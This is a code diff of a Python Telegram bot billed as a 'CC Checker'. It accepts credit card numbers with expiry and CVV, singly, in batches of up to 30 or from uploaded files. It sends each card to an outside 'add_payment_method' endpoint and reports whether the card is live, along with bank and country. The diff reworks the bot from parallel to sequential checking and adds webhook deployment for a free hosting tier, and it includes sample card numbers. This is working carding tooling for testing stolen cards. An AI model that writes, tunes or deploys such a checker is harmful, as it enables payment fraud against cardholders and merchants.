@@ -7,7 +7,6 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 from telegram.constants import ParseMode
 import logging
-from concurrent.futures import ThreadPoolExecutor
 
 # Enable logging
 logging.basicConfig(
@@ -23,17 +22,15 @@ API_URL = "https://andul-1.onrender.com/add_payment_method/sogaged371@hudisk.com
 WAITING_FOR_CARDS = 1
 WAITING_FOR_FILE = 2
 
-# Global session and semaphore for rate limiting
+# Global session
 session = None
-# Semaphore to limit concurrent requests (10 at a time)
-semaphore = asyncio.Semaphore(10)
 
 async def init_session():
     """Initialize aiohttp session"""
     global session
     if not session:
-        timeout = aiohttp.ClientTimeout(total=60)
-        connector = aiohttp.TCPConnector(limit=0)  # No limit on connections
+        timeout = aiohttp.ClientTimeout(total=30)
+        connector = aiohttp.TCPConnector(limit=1)  # Limit connections for free tier
         session = aiohttp.ClientSession(timeout=timeout, connector=connector)
 
 async def close_session():
@@ -57,7 +54,7 @@ def validate_card(card_input):
         
         card, month, year, cvv = [p.strip() for p in parts]
         
-        # Clean card number (remove all non-digits)
+        # Clean card number
         card = re.sub(r'\D', '', card)
         
         # Validate card number
@@ -86,8 +83,8 @@ def validate_card(card_input):
         logger.error(f"Validation error: {e}")
         return None, "❌ Validation error"
 
-async def check_card_fast(card_input):
-    """Check single card with retry logic - optimized version"""
+async def check_card(card_input):
+    """Check single card"""
     # Validate card first
     formatted_card, error = validate_card(card_input)
     if error:
@@ -97,34 +94,26 @@ async def check_card_fast(card_input):
     url_encoded = formatted_card.replace('|', '%7C')
     full_url = f"{API_URL}{url_encoded}"
     
-    async with semaphore:
-        # Try up to 2 times
-        for attempt in range(2):
-            try:
-                async with session.get(full_url, timeout=30) as response:
-                    response_text = await response.text()
-                    
-                    if response.status == 200:
-                        result = parse_response(formatted_card, response_text)
-                        return card_input, result
-                    else:
-                        if attempt < 1:
-                            await asyncio.sleep(1)
-                            continue
-                        return card_input, f"❌ API Error: Status {response.status}"
-                        
-            except asyncio.TimeoutError:
-                if attempt < 1:
-                    await asyncio.sleep(2)
-                    continue
-                return card_input, "❌ Request timeout"
-            except Exception as e:
-                if attempt < 1:
-                    await asyncio.sleep(1)
-                    continue
-                return card_input, "❌ Connection error"
-        
-        return card_input, "❌ Failed after retries"
+    logger.info(f"Checking: {formatted_card}")
+    
+    # Initialize session
+    await init_session()
+    
+    try:
+        async with session.get(full_url, timeout=20) as response:
+            response_text = await response.text()
+            
+            if response.status == 200:
+                result = parse_response(formatted_card, response_text)
+                return card_input, result
+            else:
+                return card_input, f"❌ API Error: Status {response.status}"
+                
+    except asyncio.TimeoutError:
+        return card_input, "❌ Request timeout"
+    except Exception as e:
+        logger.error(f"Request error: {e}")
+        return card_input, "❌ Connection error"
 
 def parse_response(card_info, response_text):
     """Parse API response and format output"""
@@ -132,7 +121,7 @@ def parse_response(card_info, response_text):
         card_parts = card_info.split('|')
         card_number = card_parts[0]
         
-        # Get BIN (first 6 digits)
+        # Get BIN
         bin_info = card_number[:6]
         
         # Determine brand
@@ -182,7 +171,7 @@ def parse_response(card_info, response_text):
             elif 'COUNTRY :' in line:
                 country = line.split('COUNTRY :')[-1].strip()
         
-        # Format result EXACTLY like your image
+        # Format result
         result = f"""- CARD : {card_info}
 - STATUS : {status}
 - RESPONSE : {status_msg}
@@ -207,39 +196,20 @@ def parse_response(card_info, response_text):
 - BANK : ERROR
 - COUNTRY : ERROR"""
 
-async def check_multiple_cards_parallel(cards):
-    """Check multiple cards in parallel"""
-    # Initialize session
-    await init_session()
-    
-    # Create tasks for all cards
-    tasks = [check_card_fast(card) for card in cards]
-    
-    # Gather results as they complete
-    results = []
-    for future in asyncio.as_completed(tasks):
-        original_card, result = await future
-        results.append((original_card, result))
-    
-    return results
-
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command"""
-    welcome_text = """💳 *ULTRA-FAST CC CHECKER BOT*
+    welcome_text = """💳 *CC CHECKER BOT (Render Webhook)*
 
 *Commands:*
 /chk - Check single card
-/mass - Check multiple cards FAST (1-30)
+/mass - Check multiple cards (1-30)
 /file - Upload .txt file with cards
 /help - Show detailed help
 
 *Format:* CARD|MM|YY|CVV
 *Example:* 5220940191435288|06|2027|404
 
-⚡ *Features:*
-- Parallel processing (10 cards at once)
-- Fast results (30 cards in ~1 minute)
-- Real-time updates"""
+⚡ *Optimized for Render Free Tier*"""
     
     await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
 
@@ -254,42 +224,46 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     card_input = ' '.join(context.args)
-    message = await update.message.reply_text("⚡ *Checking card...*", parse_mode=ParseMode.MARKDOWN)
+    message = await update.message.reply_text("🔍 *Checking card...*", parse_mode=ParseMode.MARKDOWN)
     
-    card, result = await check_card_fast(card_input)
-    
-    # Send as plain text
+    _, result = await check_card(card_input)
     await message.edit_text(result)
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /mass command - start conversation"""
-    await update.message.reply_text(
-        "⚡ *ULTRA-FAST MASS CHECK*\n\n"
-        "Send up to 30 cards (one per line):\n"
-        "```\n"
-        "4232231106894283|06|26|241\n"
-        "4116670005727071|02|26|426\n"
-        "5303471055207621|01|27|456\n"
-        "```\n"
-        "*Speed:* ~30 cards in 1-2 minutes\n"
-        "Type /cancel to stop.",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    """Handle /mass command - optimized for free tier"""
+    if not context.args:
+        await update.message.reply_text(
+            "📋 *MASS CHECK (Optimized)*\n\n"
+            "Send cards with the command:\n"
+            "`/mass card1|mm|yy|cvv card2|mm|yy|cvv`\n\n"
+            "Or type /mass and then send cards one per line\n"
+            "Type /cancel to stop.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return WAITING_FOR_CARDS
     
-    return WAITING_FOR_CARDS
+    # Cards provided inline
+    cards = []
+    for arg in context.args:
+        if '|' in arg:
+            cards.append(arg)
+    
+    if cards:
+        await process_cards_optimized(update, cards, "Mass Check")
+        return ConversationHandler.END
+    else:
+        await update.message.reply_text(
+            "📋 Please send cards (one per line):",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return WAITING_FOR_CARDS
 
 async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /file command - upload text file"""
+    """Handle /file command"""
     await update.message.reply_text(
-        "📁 *ULTRA-FAST FILE UPLOAD*\n\n"
+        "📁 *FILE UPLOAD*\n\n"
         "Send a .txt file containing cards (one per line).\n"
         "Max 30 cards.\n\n"
-        "*Format:*\n"
-        "```\n"
-        "CARD|MM|YY|CVV\n"
-        "CARD|MM|YY|CVV\n"
-        "```\n"
-        "*Speed:* ~30 cards in 1-2 minutes\n"
         "Type /cancel to stop.",
         parse_mode=ParseMode.MARKDOWN
     )
@@ -297,7 +271,7 @@ async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return WAITING_FOR_FILE
 
 async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive and process cards for mass check - FAST VERSION"""
+    """Receive and process cards for mass check"""
     user_input = update.message.text.strip()
     
     if user_input.lower() == '/cancel':
@@ -308,12 +282,15 @@ async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines = user_input.split('\n')
     cards = [line.strip() for line in lines if line.strip()]
     
-    # Process the cards in parallel
-    await process_cards_fast(update, cards, "Ultra-Fast Mass Check")
+    if not cards:
+        await update.message.reply_text("❌ No cards found.")
+        return WAITING_FOR_CARDS
+    
+    await process_cards_optimized(update, cards, "Mass Check")
     return ConversationHandler.END
 
 async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive and process file upload - FAST VERSION"""
+    """Receive and process file upload"""
     if not update.message.document:
         await update.message.reply_text("❌ Please send a .txt file.")
         return WAITING_FOR_FILE
@@ -348,7 +325,7 @@ async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ No valid cards found in file.")
             return ConversationHandler.END
         
-        await process_cards_fast(update, cards, "Ultra-Fast File Upload")
+        await process_cards_optimized(update, cards, "File Upload")
         
     except Exception as e:
         logger.error(f"File processing error: {e}")
@@ -356,8 +333,8 @@ async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     return ConversationHandler.END
 
-async def process_cards_fast(update, cards, source_name):
-    """Process list of cards in parallel - FAST VERSION"""
+async def process_cards_optimized(update, cards, source_name):
+    """Process cards optimized for free tier (sequential with status updates)"""
     # Limit to 30 cards
     if len(cards) > 30:
         await update.message.reply_text(f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
@@ -371,64 +348,57 @@ async def process_cards_fast(update, cards, source_name):
     
     # Send initial status
     status_msg = await update.message.reply_text(
-        f"⚡ *{source_name}*\n"
-        f"🔄 Starting parallel check of {total_cards} cards...\n"
-        f"⏱️ Estimated: {max(1, total_cards // 15)}-{max(2, total_cards // 10)} minutes",
+        f"🔄 *{source_name}*\n"
+        f"Processing {total_cards} cards...\n"
+        f"⏱️ Estimated time: ~{total_cards * 3} seconds",
         parse_mode=ParseMode.MARKDOWN
     )
     
-    # Start time tracking
-    import time
-    start_time = time.time()
-    
-    # Check all cards in parallel
-    results = await check_multiple_cards_parallel(cards)
-    
-    # Calculate time taken
-    end_time = time.time()
-    time_taken = end_time - start_time
-    
-    # Send results
     processed = 0
+    successful = 0
     failed = 0
     
-    # Send results in batches to avoid Telegram rate limits
-    batch_size = 5
-    for i in range(0, len(results), batch_size):
-        batch = results[i:i+batch_size]
-        
-        for j, (original_card, result) in enumerate(batch, start=i+1):
+    # Process cards sequentially (free tier friendly)
+    for i, card in enumerate(cards, 1):
+        try:
+            _, result = await check_card(card)
+            
+            # Send result immediately
             if result.startswith("- CARD :"):
-                await update.message.reply_text(
-                    f"Card {j}:\n{result}\n{'='*40}"
-                )
-                processed += 1
+                await update.message.reply_text(f"Card {i}:\n{result}\n{'='*40}")
+                successful += 1
             else:
-                await update.message.reply_text(
-                    f"❌ Card {j}: {result}"
-                )
+                await update.message.reply_text(f"❌ Card {i}: {result}")
                 failed += 1
-        
-        # Update status
-        current = min(i + batch_size, total_cards)
-        await status_msg.edit_text(
-            f"⚡ *{source_name}*\n"
-            f"📊 Progress: {current}/{total_cards} cards\n"
-            f"⏱️ Time: {time_taken:.1f}s\n"
-            f"✅ Successful: {processed}\n"
-            f"❌ Failed: {failed}",
-            parse_mode=ParseMode.MARKDOWN
-        )
+            
+            processed += 1
+            
+            # Update status every 3 cards
+            if i % 3 == 0 or i == total_cards:
+                await status_msg.edit_text(
+                    f"🔄 *{source_name}*\n"
+                    f"Progress: {i}/{total_cards} cards\n"
+                    f"✅ Successful: {successful}\n"
+                    f"❌ Failed: {failed}",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            
+            # Small delay to avoid rate limits (free tier)
+            if i < total_cards:
+                await asyncio.sleep(0.5)
+                
+        except Exception as e:
+            logger.error(f"Error processing card {i}: {e}")
+            await update.message.reply_text(f"❌ Card {i}: Failed to check")
+            failed += 1
     
     # Final summary
     await status_msg.edit_text(
-        f"✅ *{source_name} COMPLETE!*\n"
-        f"⏱️ Total time: {time_taken:.1f} seconds\n"
+        f"✅ *{source_name} Complete!*\n"
         f"📊 Results:\n"
-        f"  ✅ Successful: {processed}\n"
+        f"  ✅ Successful: {successful}\n"
         f"  ❌ Failed: {failed}\n"
-        f"  📋 Total: {total_cards}\n"
-        f"⚡ Speed: {time_taken/total_cards:.2f}s per card",
+        f"  📋 Total: {total_cards}",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -439,7 +409,7 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show detailed help"""
-    help_text = """⚡ *ULTRA-FAST CC CHECKER BOT HELP*
+    help_text = """📚 *CC CHECKER BOT HELP (Render Optimized)*
 
 *Commands:*
 /start - Show commands
@@ -448,36 +418,29 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 /mass - Check multiple cards (1-30)
 /file - Upload .txt file with cards
 
-*Card Format:*CARD_NUMBER|MM|YYYY|CVV
+*Usage Examples:*/chk 5220940191435288|06|2027|404
+/mass 4232231106894283|06|26|241
     
-*Speed Features:*
-- Parallel processing (10 cards simultaneously)
-- 30 cards in 1-2 minutes
-- Real-time progress updates
-- Batch processing
+*For Render Free Tier:*
+- Sequential processing (no parallel)
+- 30 cards in ~1.5 minutes
+- Optimized for 750 free hours/month
 
-*Examples:*/chk 5220940191435288|06|2027|404
-/mass
-4232231106894283|06|26|241
-    
 *File Upload:*
-1. Create a .txt file with cards (one per line)
-2. Use /file command
-3. Send the file
-4. Bot will check all cards FAST
-
-*Note:* Year can be 2 or 4 digits (26 or 2026)"""
-    
+Create a .txt file with cards (one per line):
+CARD|MM|YY|CVV
+CARD|MM|YY|CVV
+        
     await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
 
 async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle direct card messages (without command)"""
+    """Handle direct card messages"""
     text = update.message.text.strip()
     
     # Check if it looks like a card
     if '|' in text and text.count('|') == 3 and any(c.isdigit() for c in text):
-        message = await update.message.reply_text("⚡ *Checking card...*", parse_mode=ParseMode.MARKDOWN)
-        card, result = await check_card_fast(text)
+        message = await update.message.reply_text("🔍 *Checking card...*", parse_mode=ParseMode.MARKDOWN)
+        _, result = await check_card(text)
         await message.edit_text(result)
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -492,16 +455,23 @@ async def post_stop(application):
     """Cleanup on stop"""
     await close_session()
 
+# Webhook setup function
+async def set_webhook(application, webhook_url):
+    """Set webhook for Render"""
+    await application.bot.set_webhook(url=webhook_url)
+
 def main():
-    """Start the bot"""
+    """Start the bot with webhook for Render"""
     TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+    PORT = int(os.getenv('PORT', 8080))  # Render provides PORT
+    WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')  # Set in Render environment
+    
     if not TOKEN:
         print("❌ Error: TELEGRAM_BOT_TOKEN not set")
-        print("Set it with: export TELEGRAM_BOT_TOKEN='your_token_here'")
         return
     
-    print("🤖 Starting ULTRA-FAST CC Checker Bot...")
-    print("⚡ Bot can check 30 cards in 1-2 minutes!")
+    print("🤖 Starting CC Checker Bot for Render...")
+    print(f"📡 Port: {PORT}")
     
     # Create application
     application = Application.builder().token(TOKEN).post_stop(post_stop).build()
@@ -544,8 +514,35 @@ def main():
     print("✅ Bot is ready!")
     print("📱 Use /start to see commands")
     
-    # Run
-    application.run_polling(drop_pending_updates=True)
+    # Check if running on Render (has PORT env var)
+    if PORT != 8080 or WEBHOOK_URL:
+        # Run with webhook for Render
+        print("🌐 Running in Webhook mode for Render...")
+        
+        import asyncio
+        from telegram.ext import Updater
+        
+        async def run_webhook():
+            await application.initialize()
+            
+            # Set webhook if URL provided
+            if WEBHOOK_URL:
+                await set_webhook(application, WEBHOOK_URL)
+                print(f"✅ Webhook set to: {WEBHOOK_URL}")
+            else:
+                # Start without webhook for local testing
+                await application.start()
+                await application.updater.start_polling(drop_pending_updates=True)
+                print("✅ Started polling (local mode)")
+                
+                # Keep running
+                await asyncio.Event().wait()
+        
+        asyncio.run(run_webhook())
+    else:
+        # Run with polling locally
+        print("🔄 Running in Polling mode (local)...")
+        application.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
     try:
